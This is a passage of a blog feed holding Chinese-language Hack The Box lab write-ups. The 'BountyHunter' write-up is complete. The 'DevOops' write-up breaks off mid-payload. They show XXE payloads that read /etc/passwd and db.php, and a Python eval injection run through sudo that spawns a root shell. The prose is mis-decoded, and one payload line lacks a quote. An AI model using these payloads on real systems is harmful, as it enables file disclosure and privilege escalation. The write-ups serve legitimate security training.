<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Easy</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.11.100 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-22 09:08 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.11.100
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.12s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">8</span>.2p1 Ubuntu 4ubuntu0.2 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">3072</span> d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> a2:1e:67:61:8d:2f:7a:37:a7:ba:3b:51:08:e8:89:a6 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> a5:75:16:d9:69:58:50:4a:14:11:7a:42:c1:b6:23:44 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    Apache httpd <span class="token number">2.4</span>.41 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: Bounty Hunters
<span class="token operator">|</span>_http-server-header: Apache/2.4.41 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">99.59</span> seconds
</code></pre>

<p>å¼€æ”¾äº†2ä¸ªç«¯å£22(SSH)å’Œ80(HTTP)ï¼Œå¯¹80è¿›è¡ŒFuzz</p>
<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>æ‰¾åˆ°&#x2F;index.phpã€ &#x2F;portal.phpã€ &#x2F;db.php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://10.10.11.100/FUZZ.php  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://10.10.11.100/FUZZ.php
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________
index                   <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">25169</span>, Words: <span class="token number">10028</span>, Lines: <span class="token number">389</span>, Duration: 3174ms<span class="token punctuation">]</span>
portal                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">125</span>, Words: <span class="token number">11</span>, Lines: <span class="token number">6</span>, Duration: 204ms<span class="token punctuation">]</span>
db                      <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">0</span>, Words: <span class="token number">1</span>, Lines: <span class="token number">1</span>, Duration: 105ms<span class="token punctuation">]</span></code></pre>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—®&#x2F;portal.php è·³è½¬åˆ°è¡¨å•é¡µé¢</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104837169.png" class="" title="è·³è½¬">

<p>ä½¿ç”¨burpè¿›è¡ŒæŠ“åŒ…ï¼Œå¯¹æ•°æ®åŒ…è¿›è¡Œbase64è§£ç ï¼Œå‘ç°æ˜¯XML</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104858450.png" class="" title="è¡¨å•">

<p>å°è¯•è¿›è¡ŒXXEæ”»å‡»ï¼Œæ‰¾åˆ°ä¸¤ä¸ªå¸å·ï¼šdevelopmentå’Œroot</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222092505979.png" class="" title="XXE">

<p>ä½¿ç”¨PHP Wrapper è¯»å–db.phpæ–‡ä»¶</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml  version="1.0" encoding="ISO-8859-1"?></span>
&lt;!DOCTYPE replace [&lt;!ENTITY example SYSTEM php://filter/convert.base64-encode/resource=db.php"> ]>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bugreport</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cwe</span><span class="token punctuation">></span></span>111<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cwe</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cvss</span><span class="token punctuation">></span></span>3.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cvss</span><span class="token punctuation">></span></span>
		<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>reward</span><span class="token punctuation">></span></span>20<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>reward</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bugreport</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222094939072.png" class="" title="XXE">

<p>è§£ç base64,æ‰¾åˆ°æ•°æ®åº“å¯†ç ï¼Œä½¿ç”¨developmentç™»å½•SSH</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222095232981.png" class="" title="è§£ç ">

<h3 id="æƒé™æå‡"><a href="#æƒé™æå‡" class="headerlink" title="æƒé™æå‡"></a>æƒé™æå‡</h3><p>ä½¿ç”¨<code>sudo -l</code>æ‰¾ä¸ªä¸€ä¸ªå¯åˆ©ç”¨çš„Pythonæ–‡ä»¶</p>
<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222101020734.png" class="" title="ææƒ">

<p>åˆ†æPythonè„šæœ¬</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#Skytrain Inc Ticket Validation System 0.1</span>
<span class="token comment">#Do not distribute this file.</span>

<span class="token keyword">def</span> <span class="token function">load_file</span><span class="token punctuation">(</span>loc<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> loc<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">".md"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>loc<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Wrong file type."</span><span class="token punctuation">)</span>
        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">evaluate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment">#Evaluates a ticket to check for ireggularities.</span>
    code_line <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>ticketFile<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"# Skytrain Inc"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token operator">//</span> md æ–‡æ¡£ç¬¬<span class="token number">1</span>è¡Œéœ€è¦åŒ…å«
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"## Ticket to "</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token operator">//</span>md æ–‡æ¡£ç¬¬<span class="token number">2</span>è¡Œéœ€è¦åŒ…å«ï¼Œæ³¨æ„æœ‰ä¸ªç©ºæ ¼
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Destination: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">' '</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"__Ticket Code:__"</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token operator">//</span>md æ–‡æ¡£ç¬¬<span class="token number">3</span>è¡Œéœ€è¦åŒ…å«
            code_line <span class="token operator">=</span> i<span class="token operator">+</span><span class="token number">1</span>
            <span class="token keyword">continue</span>

        <span class="token keyword">if</span> code_line <span class="token keyword">and</span> i <span class="token operator">==</span> code_line<span class="token punctuation">:</span>  <span class="token operator">//</span>md æ–‡æ¡£ç¬¬<span class="token number">4</span>è¡Œéœ€è¦åŒ…å«
            <span class="token keyword">if</span> <span class="token keyword">not</span> x<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token boolean">False</span>
            ticketCode <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token operator">//</span>åŒ¹é…<span class="token operator">**</span>å¼€å¤´ï¼Œå¹¶ä¸”æ ¹æ®<span class="token operator">+</span>åˆ†å‰²ï¼Œå–ç¬¬ä¸€é¡¹
            <span class="token keyword">if</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ticketCode<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">7</span> <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>  <span class="token operator">//</span>å–å‡ºçš„å€¼æ¨¡<span class="token number">7</span> ç­‰äº<span class="token number">4</span> å¦‚<span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span>ï¼Œ<span class="token number">18</span>
                validationNumber <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"**"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> validationNumber <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">True</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token boolean">False</span>
    <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    fileName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Please enter the path to the ticket file.\n"</span><span class="token punctuation">)</span>
    ticket <span class="token operator">=</span> load_file<span class="token punctuation">(</span>fileName<span class="token punctuation">)</span>
    <span class="token comment">#DEBUG print(ticket)</span>
    result <span class="token operator">=</span> evaluate<span class="token punctuation">(</span>ticket<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Valid ticket."</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Invalid ticket."</span><span class="token punctuation">)</span>
    ticket<span class="token punctuation">.</span>close

main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>

<p>åˆ†æPythonè„šæœ¬åï¼Œåˆ›å»ºä¸€ä¸ªmdæ–‡ä»¶ï¼Œä½¿ç”¨sudo è¿è¡Œè„šæœ¬ï¼ŒææƒæˆåŠŸ</p>
<pre class="language-none"><code class="language-none"># Skytrain Inc
## Ticket to 
__Ticket Code:__
**11+eval(&quot;__import__(&#39;os&#39;).system(&#39;bash&#39;)&quot;)</code></pre>

<img src="/Hackthebox/htb/htb-bountyhunter/image-20250222104056058.png" class="" title="Getshell">

<table>
<thead>
<tr>
<th align="left">Flag</th>
<th align="left">Path</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Flag1</td>
<td align="left">&#x2F;home&#x2F;development&#x2F;user.txt</td>
</tr>
<tr>
<td align="left">Flag2</td>
<td align="left">&#x2F;root&#x2F;root.txt</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>Hackthebox</category>
      </categories>
      <tags>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>HTB-DevOops</title>
    <url>/Hackthebox/htb/htb-devoops/</url>
    <content><![CDATA[<style>.dkcqgogmjqsc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-devoops/c74d84352f781ad5c7a4c35c0c3aa0ac.png" class="dkcqgogmjqsc">

<span id="more"></span>

<table>
<thead>
<tr>
<th align="left">OS</th>
<th align="left">Difficulty</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Linux</td>
<td align="left">Medium</td>
</tr>
</tbody></table>
<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><pre class="language-bash" data-language="bash"><code class="language-bash">$ nmap <span class="token number">10.10</span>.10.91 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sC</span>  -p- <span class="token parameter variable">-T4</span> --min-rate <span class="token number">1000</span> <span class="token parameter variable">-e</span> tun0 
Starting Nmap <span class="token number">7.95</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2025</span>-02-21 <span class="token number">22</span>:09 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">10.10</span>.10.91
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.19s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65533</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT     STATE SERVICE VERSION
<span class="token number">22</span>/tcp   <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.2p2 Ubuntu 4ubuntu2.4 <span class="token punctuation">(</span>Ubuntu Linux<span class="token punctuation">;</span> protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> <span class="token number">42</span>:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">5000</span>/tcp <span class="token function">open</span>  http    Gunicorn <span class="token number">19.7</span>.1
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>utf-8<span class="token punctuation">)</span>.
<span class="token operator">|</span>_http-server-header: gunicorn/19.7.1
Service Info: OS: Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">130.88</span> seconds
</code></pre>

<p>å¼€æ”¾äº†ä¸¤ä¸ªç«¯å£22(SSH)å’Œ5000(HTTP)ï¼Œæ·»åŠ æœ¬åœ°åŸŸåè§£æåˆ°hostsæ–‡ä»¶</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ <span class="token builtin class-name">echo</span> <span class="token string">'10.10.10.91 devoops.htb'</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> <span class="token parameter variable">-a</span> /etc/hosts </code></pre>

<h3 id="ç›®å½•Fuzzing"><a href="#ç›®å½•Fuzzing" class="headerlink" title="ç›®å½•Fuzzing"></a>ç›®å½•Fuzzing</h3><p>ä½¿ç”¨ffuf å·¥å…·å¯¹ç›®å½•è¿›è¡ŒçŒœè§£ï¼Œå‘ç°&#x2F;uploadã€&#x2F;feedã€&#x2F;newpost</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">$ ffuf <span class="token parameter variable">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ <span class="token parameter variable">-u</span> http://devoops.htb:5000/FUZZ  <span class="token parameter variable">-t</span> <span class="token number">100</span> <span class="token parameter variable">-ic</span>

        /<span class="token string">'___\  /'</span>___<span class="token punctuation">\</span>           /'___<span class="token punctuation">\</span>       
       /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/ /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/  __  __  /<span class="token punctuation">\</span> <span class="token punctuation">\</span>__/       
       <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span><span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span>/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> ,__<span class="token punctuation">\</span>      
        <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/ <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span> <span class="token punctuation">\</span>_/      
         <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>   <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>  <span class="token punctuation">\</span> <span class="token punctuation">\</span>____/  <span class="token punctuation">\</span> <span class="token punctuation">\</span>_<span class="token punctuation">\</span>       
          <span class="token punctuation">\</span>/_/    <span class="token punctuation">\</span>/_/   <span class="token punctuation">\</span>/___/    <span class="token punctuation">\</span>/_/       

       v2.1.0-dev
________________________________________________

 :: Method           <span class="token builtin class-name">:</span> GET
 :: URL              <span class="token builtin class-name">:</span> http://devoops.htb:5000/FUZZ
 :: Wordlist         <span class="token builtin class-name">:</span> FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Calibration      <span class="token builtin class-name">:</span> <span class="token boolean">false</span>
 :: Timeout          <span class="token builtin class-name">:</span> <span class="token number">10</span>
 :: Threads          <span class="token builtin class-name">:</span> <span class="token number">100</span>
 :: Matcher          <span class="token builtin class-name">:</span> Response status: <span class="token number">200</span>-299,301,302,307,401,403,405,500
________________________________________________

                        <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">285</span>, Words: <span class="token number">43</span>, Lines: <span class="token number">1</span>, Duration: 297ms<span class="token punctuation">]</span>
upload                  <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">347</span>, Words: <span class="token number">44</span>, Lines: <span class="token number">1</span>, Duration: 167ms<span class="token punctuation">]</span>
feed                    <span class="token punctuation">[</span>Status: <span class="token number">200</span>, Size: <span class="token number">546263</span>, Words: <span class="token number">6030</span>, Lines: <span class="token number">1816</span>, Duration: 299ms<span class="token punctuation">]</span>
newpost                 <span class="token punctuation">[</span>Status: <span class="token number">405</span>, Size: <span class="token number">178</span>, Words: <span class="token number">20</span>, Lines: <span class="token number">5</span>, Duration: 109ms<span class="token punctuation">]</span></code></pre>

<h3 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>è®¿é—® &#x2F;upload åœ¨ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹å¯ä»¥çœ‹åˆ°xmlæ ¼å¼</p>
<img src="/Hackthebox/htb/htb-devoops/image-20250221224346237.png" class="" title="upload">

<p>æ„é€ ä¸€ä¸ªç®€å•xmlæµ‹è¯•ï¼Œå¯ä»¥çœ‹åˆ°Doeè¢«è§£æå‡ºæ¥</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>!ENTITY</span> <span class="token attr-name">example</span> <span class="token attr-name">"Doe"</span><span class="token punctuation">></span></span> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Content</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&example;">&amp;example;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Content</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></code></pre>

<img src="/Hackthebox/htb/htb-devoops/image-20250221225731266.png" class="" title="xxe">

<p>ä¿®æ”¹xml è¯»å–&#x2F;etc&#x2F;passwd æ–‡ä»¶</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">replace</span> <span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY example SYSTEM "file:///etc/passwd"> </span><span class="token punctuation">]</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Author</span><span class="token punctuation">></span></span>Lee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Author</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Subject</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Subject</span><span class="token punctuation">></span></span>
